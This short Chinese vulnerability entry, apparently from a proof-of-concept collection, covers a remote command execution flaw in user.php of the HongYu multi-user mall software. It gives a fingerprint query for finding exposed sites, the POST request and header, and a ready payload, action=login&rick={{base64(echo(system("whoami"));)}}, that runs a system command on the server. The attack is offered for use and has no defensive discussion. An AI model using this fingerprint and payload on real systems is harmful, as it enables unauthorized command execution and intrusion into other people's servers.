# 鸿宇多用户商城user.php存在远程命令执行漏洞

- **系统**：鸿宇多用户商城　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`body="content=HongYuJD"`
- **请求**：`POST /user.php HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
action=login&rick={{base64(echo(system("whoami"));)}}
命令需要base64编码\

\[hydyhsc-user-rce.yaml]\(公众号：渗透安全HackTwo
```

**其他**
- 鸿宇多用户商城user.php存在远程命令执行漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 鸿宇多用户商城系统